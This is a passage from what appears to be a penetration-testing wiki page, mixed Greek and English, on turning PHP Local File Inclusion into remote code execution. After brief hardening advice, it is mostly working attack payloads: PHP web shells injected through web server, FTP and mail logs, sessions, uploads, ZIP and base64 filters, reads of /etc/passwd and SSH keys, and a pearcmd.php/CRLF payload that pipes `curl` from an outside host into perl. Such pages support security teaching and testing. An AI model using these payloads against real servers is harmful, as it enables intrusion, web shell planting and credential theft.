Σκληροποίηση που αποτρέπει αυτή την κατηγορία σφαλμάτων:
- Επιλύστε σε κανονική διαδρομή και επιβάλετε ότι είναι απόγονος ενός επιτρεπόμενου (allow-listed) βασικού καταλόγου.
- Απορρίψτε οποιαδήποτε διαδρομή περιέχει `..`, absolute roots, ή drive letters· προτιμήστε generated filenames.
- Τρέξτε τον writer ως λογαριασμό χαμηλών προνομίων και απομονώστε τους write directories από τα served roots.

## Remote File Inclusion

Εξηγήθηκε προηγουμένως, [**follow this link**](#remote-file-inclusion).

### Via Apache/Nginx log file

If the Apache or Nginx server is **vulnerable to LFI** inside the include function you could try to access to **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`**, set inside the **user agent** or inside a **GET parameter** a php shell like **`<?php system($_GET['c']); ?>`** and include that file

> [!WARNING]
> Σημειώστε ότι **εάν χρησιμοποιήσετε double quotes** για το shell αντί για **simple quotes**, τα double quotes θα τροποποιηθούν στη συμβολοσειρά "_**quote;**_", **η PHP θα ρίξει σφάλμα** εκεί και **τίποτε άλλο δεν θα εκτελεστεί**.
>
> Επίσης, βεβαιωθείτε ότι **γράφετε σωστά το payload** αλλιώς η PHP θα πετάει σφάλμα κάθε φορά που προσπαθεί να φορτώσει το log αρχείο και δεν θα έχετε δεύτερη ευκαιρία.

This could also be done in other logs but **be careful,** the code inside the logs could be URL encoded and this could destroy the Shell. The header **authorisation "basic"** contains "user:password" in Base64 and it is decoded inside the logs. The PHPShell could be inserted inside this header.\ Άλλες πιθανές διαδρομές log:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Μέσω Email

**Στείλτε ένα mail** σε έναν εσωτερικό λογαριασμό (user@localhost) που περιέχει το PHP payload σας όπως `<?php echo system($_REQUEST["cmd"]); ?>` και προσπαθήστε να κάνετε include στο mail του χρήστη με ένα μονοπάτι όπως **`/var/mail/<USERNAME>`** ή **`/var/spool/mail/<USERNAME>`**

### Μέσω /proc/*/fd/*

1. Ανεβάστε πολλά shells (π.χ.: 100)  
2. Κάντε include [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), με $PID = PID της διεργασίας (can be brute forced) και $FD = το file descriptor (can be brute forced too)

### Μέσω /proc/self/environ

Όπως ένα αρχείο καταγραφής, στείλτε το payload στο User-Agent, θα αντανακλαστεί μέσα στο αρχείο /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Μέσω ανέβασματος

Αν μπορείς να ανεβάσεις ένα αρχείο, απλά inject το shell payload μέσα σε αυτό (π.χ.: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Για να διατηρηθεί το αρχείο αναγνώσιμο, είναι καλύτερο να εγχύσετε τα metadata στις pictures/doc/pdf

### Μέσω ανεβάσματος αρχείου ZIP

Ανεβάστε ένα ZIP αρχείο που περιέχει έναν συμπιεσμένο PHP shell και αποκτήστε πρόσβαση:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Μέσω PHP sessions

Ελέγξτε αν ο ιστότοπος χρησιμοποιεί PHP Session (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
Στο PHP αυτές οι sessions αποθηκεύονται σε _/var/lib/php5/sess\\_\[PHPSESSID]\_ αρχεία
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Ορίστε το cookie σε `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Χρησιμοποίησε το LFI για να συμπεριλάβεις το αρχείο session του PHP
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Μέσω ssh

Αν το ssh είναι ενεργό, ελέγξτε ποιος χρήστης χρησιμοποιείται (/proc/self/status & /etc/passwd) και προσπαθήστε να αποκτήσετε πρόσβαση στο **\<HOME>/.ssh/id_rsa**

### **Μέσω** **vsftpd** _**logs**_

Τα logs για τον FTP server vsftpd βρίσκονται στο _**/var/log/vsftpd.log**_. Σε σενάριο όπου υπάρχει Local File Inclusion (LFI) ευπάθεια, και είναι δυνατή η πρόσβαση σε έναν εκτεθειμένο vsftpd server, μπορούν να εξεταστούν τα εξής βήματα:

1. Εισάγετε ένα PHP payload στο πεδίο username κατά τη διάρκεια της διαδικασίας σύνδεσης.
2. Μετά την ένεση, χρησιμοποιήστε την LFI για να ανακτήσετε τα logs του server από _**/var/log/vsftpd.log**_.

### Μέσω php base64 filter (using base64)

Όπως φαίνεται σε [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) άρθρο, το PHP base64 filter απλώς αγνοεί τους χαρακτήρες που δεν είναι base64. Μπορείτε να το χρησιμοποιήσετε για να παρακάμψετε τον έλεγχο κατάληξης αρχείου: αν δώσετε base64 που τελειώνει με ".php", θα αγνοήσει το "." και θα προσθέσει "php" στο base64. Εδώ ένα παράδειγμα payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Via php filters (no file needed)

Αυτό το [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)εξηγεί ότι μπορείτε να χρησιμοποιήσετε **php filters to generate arbitrary content** ως έξοδο. Το οποίο ουσιαστικά σημαίνει ότι μπορείτε να **generate arbitrary php code** για το include **without needing to write** το σε αρχείο.

{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Via segmentation fault

**Upload** ένα αρχείο που θα αποθηκευτεί ως **temporary** στο `/tmp`, τότε στο **same request,** προκαλέστε ένα **segmentation fault**, και τότε το **temporary file won't be deleted** και μπορείτε να το αναζητήσετε.

{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Via Nginx temp file storage

Αν βρείτε μια **Local File Inclusion** και το **Nginx** τρέχει μπροστά από το PHP, μπορεί να καταφέρετε να αποκτήσετε RCE με την παρακάτω τεχνική:

{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Via PHP_SESSION_UPLOAD_PROGRESS

Αν βρείτε μια **Local File Inclusion** ακόμη κι αν **don't have a session** και `session.auto_start` είναι `Off`. Αν παρέχετε το **`PHP_SESSION_UPLOAD_PROGRESS`** στα δεδομένα **multipart POST**, το PHP θα **enable the session for you**. Μπορείτε να εκμεταλλευτείτε αυτό για να αποκτήσετε RCE:

{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Via temp file uploads in Windows

Αν βρείτε μια **Local File Inclusion** και ο server τρέχει σε **Windows** μπορεί να αποκτήσετε RCE:

{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Via `pearcmd.php` + URL args

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), το script `/usr/local/lib/phppearcmd.php` υπάρχει από προεπιλογή σε php docker images. Επιπλέον, είναι δυνατό να pass arguments στο script μέσω του URL επειδή αναφέρεται ότι αν μια URL param δεν έχει `=`, θα πρέπει να χρησιμοποιηθεί ως argument. Δείτε επίσης [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) και [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

Το ακόλουθο request δημιουργεί ένα αρχείο στο `/tmp/hello.php` με το περιεχόμενο `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
Το ακόλουθο εκμεταλλεύεται μια CRLF vuln για να αποκτήσει RCE (από [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Μέσω phpinfo() (file_uploads = on)

Αν βρεις μια **Local File Inclusion** και ένα αρχείο που εμφανίζει **phpinfo()** με file_uploads = on μπορείς να αποκτήσεις RCE:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### Μέσω compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

Αν βρεις μια **Local File Inclusion** και **can exfiltrate the path** του προσωρινού αρχείου ΑΛΛΑ ο **server** ελέγχει αν το **file to be included has PHP marks**, μπορείς να προσπαθήσεις να **bypass that check** με αυτήν την **Race Condition**:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### Μέσω eternal waiting + bruteforce

Αν μπορείς να εκμεταλλευτείς το LFI για να **upload temporary files** και να κάνεις τον διακομιστή να **hang** την εκτέλεση PHP, τότε μπορείς να **brute force filenames during hours** για να βρεις το προσωρινό αρχείο:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### Σε Fatal Error

Αν συμπεριλάβεις οποιοδήποτε από τα αρχεία `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Πρέπει να συμπεριλάβεις το ίδιο δύο φορές για να προκαλέσεις αυτό το σφάλμα).

**Δεν ξέρω πόσο χρήσιμο είναι αυτό αλλά μπορεί να είναι.**\
_Ακόμα κι αν προκαλέσεις ένα PHP Fatal Error, τα προσωρινά αρχεία PHP που ανεβάστηκαν διαγράφονται._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>


## References

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
